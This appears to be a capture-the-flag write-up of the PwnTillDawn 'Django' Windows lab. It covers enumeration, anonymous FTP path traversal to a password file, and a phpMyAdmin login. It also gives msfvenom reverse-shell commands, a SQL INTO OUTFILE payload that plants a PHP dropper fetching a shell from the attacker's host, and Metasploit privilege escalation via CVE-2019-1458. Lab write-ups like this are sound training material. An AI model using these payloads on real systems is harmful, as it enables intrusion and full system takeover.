---
title: "PwnTillDawn - Django"
author: Nasrallah
description: ""
date: 2022-08-21 00:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, windows, easy, sql, php, metasploit, msfvenom, phpmyadmin, reverse-shell, ftp, cve]
img_path: /assets/img/pwntilldawn/django
---

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Django](https://online.pwntilldawn.com/Target/Show/7) from [PwnTillDawn](https://online.pwntilldawn.com/). The target is running a FTP server where we can directory traversal. With that, we find root password that let us into a login page in the webserver. We then exploit a feature in the service running in the webserver to get foothold into the target machine. With a CVE, were able to get SYSTEM access.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.212                                           
Host is up (0.086s latency).                                                  
Not shown: 986 closed tcp ports (reset)                                       
PORT      STATE SERVICE      VERSION                                          
21/tcp    open  ftp                                                                                                                                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                       
| drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 . [NSE: writeable]
| drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 .. [NSE: writeable]
| drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 FLAG [NSE: writeable]
| -rw-rw-rw-   1 ftp      ftp        34419 Mar 26  2019 xampp-control.log [NSE: writeable]
|_-rw-rw-rw-   1 ftp      ftp          881 Nov 13  2018 zen.txt [NSE: writeable]    
|_ftp-bounce: bounce working!                                                 
| ftp-syst:                                                                   
|_  SYST: Internet Component Suite                                            
| fingerprint-strings:                                                        
|   GenericLines:    
|     220-Wellcome to Home Ftp Server!                                        
|     Server ready.                                                           
|     command not understood.    
|     command not understood.                                                                                                                                
|   Help:                                                                     
|     220-Wellcome to Home Ftp Server!                                        
|     Server ready.  
|     'HELP': command not understood.                                                                                                                        
|   NULL, SMBProgNeg:                                                         
|     220-Wellcome to Home Ftp Server!                                        
|     Server ready.                
|   SSLSessionReq:                                                            
|     220-Wellcome to Home Ftp Server!                                                                                                                       
|     Server ready.                                                           
|_    command not understood.                                                 
80/tcp    open  http         Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
| http-title: Welcome to XAMPP                                                
|_Requested resource was http://10.150.150.212/dashboard/
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)                                                                  [21/70]
| ssl-cert: Subject: commonName=localhost                                                                                                                    
| Not valid before: 2009-11-10T23:48:47                                                                                                                      
|_Not valid after:  2019-11-08T23:48:47                                                                                                                      
| tls-alpn:                                                                                                                                                  
|_  http/1.1                                                                                                                                                 
|_ssl-date: TLS randomness does not represent time                            
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38         
|_http-title: Bad request!                                                    
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: PWNTILLDAWN)
3306/tcp  open  mysql        MariaDB (unauthorized)                                                                                                          
8089/tcp  open  ssl/http     Splunkd httpd                                                                                                                   
|_http-title: splunkd                                                         
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-29T14:31:26                                      
|_Not valid after:  2022-10-28T14:31:26                                                                                                                      
|_http-server-header: Splunkd                                                                                                                                
49152/tcp open  msrpc        Microsoft Windows RPC                            
49153/tcp open  msrpc        Microsoft Windows RPC                            
49154/tcp open  msrpc        Microsoft Windows RPC                            
49155/tcp open  msrpc        Microsoft Windows RPC                            
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC 
Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Django
|   NetBIOS computer name: DJANGO\x00
|   Workgroup: PWNTILLDAWN\x00
|_  System time: 2022-08-20T11:34:16+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 13m14s, deviation: 5s, median: 13m11s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-20T11:34:14
|_  start_date: 2020-04-02T14:41:43

```

There are quite a lot of open ports, but the ones that could be useful to us are 21(FTP), 80(HTTP) and 445(SMB).

## FTP

From the nmap scan, we saw the the ftp server allows anonymous login. So let's connect to ftp as user `anonymous` and a blank password.

```bash
$ ftp 10.150.150.212
Connected to 10.150.150.212.
220-Wellcome to Home Ftp Server!
220 Server ready.
Name (10.150.150.212:sirius): anonymous
331 Password required for anonymous.
Password: 
230 User Anonymous logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,150,150,212,192,75).
150 Opening data connection for directory list.
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 .
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 ..
drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 FLAG
-rw-rw-rw-   1 ftp      ftp        34419 Mar 26  2019 xampp-control.log
-rw-rw-rw-   1 ftp      ftp          881 Nov 13  2018 zen.txt
226 File sent ok
ftp> get xampp-control.log
local: xampp-control.log remote: xampp-control.log
227 Entering Passive Mode (10,150,150,212,192,77).
150 Opening data connection for xampp-control.log.
100% |****************************************************************************************************************| 34419       70.51 KiB/s    00:00 ETA
226 File sent ok
34419 bytes received in 00:00 (59.07 KiB/s)
ftp> get zen.txt
local: zen.txt remote: zen.txt
227 Entering Passive Mode (10,150,150,212,192,78).
150 Opening data connection for zen.txt.
100% |****************************************************************************************************************|   881       72.97 KiB/s    00:00 ETA
226 File sent ok
881 bytes received in 00:00 (8.87 KiB/s)
ftp> cd FLAG
250 CWD command successful. "/FLAG" is current directory.
ftp> get 
.               ..              FLAG19.txt
ftp> get FLAG19.txt
local: FLAG19.txt remote: FLAG19.txt
227 Entering Passive Mode (10,150,150,212,192,80).
150 Opening data connection for FLAG19.txt.
100% |****************************************************************************************************************|    40      610.35 KiB/s    00:00 ETA
226 File sent ok
40 bytes received in 00:00 (0.43 KiB/s)
ftp> 
```

We managed to find a flag, a log file and a text file, we download them with the following command `get {filename}`.

Let's inspect the log file with the command `less xampp-control.log`.

![](1.png)

the is a password written in: "c:\xampp\passwords.txt".

Let's see if we can reach it in the ftp server.

```terminal
ftp> get c:\\xampp\\passwords.txt
local: c:\xampp\passwords.txt remote: c:\xampp\passwords.txt
227 Entering Passive Mode (10,150,150,212,192,83).
150 Opening data connection for c:\xampp\passwords.txt.
100% |****************************************************************************************************************|   816       17.70 KiB/s    00:00 ETA
226 File sent ok
816 bytes received in 00:00 (5.82 KiB/s)
ftp> 
```

Nice, we managed to download it using the command `get c:\\xampp\\passwords.txt`.
>Notice the double backslash

Let's see what' on the file.

![](2.png)

We got root password.

## WEB

Let's navigate to the webserver http://10.150.150.212/ .

![](3.png)

We got the welcome page of `XAMPP`. On the up right corner, we find `phpmyadmin` when we click it it sends us to the following login page.

![](4.png)

Let's try the credentials we got from password.txt file.

![](5.png)

We got in, if we go the the `Databases` on the up-right corner, we get another flag.

![](6.png)


For the other two flags, we can find one in the `c:\xampp` directory, and the other in one of the users's desktop directory.

![](7.png)

# **Foothold**

Even though we've got all the flags, let's get a shell.

First, we need to generate a php reverse shell using msfvenom.

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f raw -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload                                                                           
[-] No arch selected, selecting arch: php from the payload                    
No encoder specified, outputting raw payload                                                                                                                 
Payload size: 34851 bytes                                                     
Saved as: shell.php 
```

>Change the LHOST value to your tun0 ip.

now on the same directory, setup an http server with python using the following command `sudo python3 -m http.server 80`.

Now let's move to `phpmyadmin`. Click on the flag database, then on the SQL Tab and enter the following code.

```sql
SELECT "<?php file_put_contents('shell.php',file_get_contents('http://10.11.10.10/shell.php'))?>" INTO OUTFILE "C:\\xampp\\htdocs\\up.php"
```

>Change the ip address to your tun0 ip.

This sql query would save a php code to a file in the root directory of the web server.

What the php code does is save the payload we generated with msfvenom to the root directory of the webserver.

Now press go.

![](8.png)

Now we need to request the first php file "up.php" so that our reverse shell payload would get uploaded. We can do that with either the browser or using `curl`.

![](9.png)

Great! We can see it got uploaded successfully.

Now go to metasploit and use the multi/handler module and set the following options.

```
set payload php/meterpreter_reverse_tcp
set lhost tun0
set lport 9999
```

Now press run and request the `shell.php` file.

![](10.png)

We got the shell.

# **Privilege Escalation**

The current shell we have doesn't help us do much, so let's upgrade it first.

Generate another shell with `msfvenom` but this time it's gonna be a .exe executable and with x64 architecture.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.66.66.158 LPORT=7777 -f exe -o shell.exe
```

Upload it to the target machine using meterpreter upload function.

Set up another multi handler with the correct options and run it in the background with `run -j`.

Back to the meterpreter session, execute the binary with `execute -f shell.exe`, you should see a meterpreter session getting opened.

![](11.png)

Nice, now if we run `exploit_suggester` module, it's going to suggest some modules that would help us escalate our privileges.

![](13.png)


The exploit we're going to use is `windows/local/cve_2019_1458_wizardopium`.

![](12.png)

Great! We have SYSTEM privileges now.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
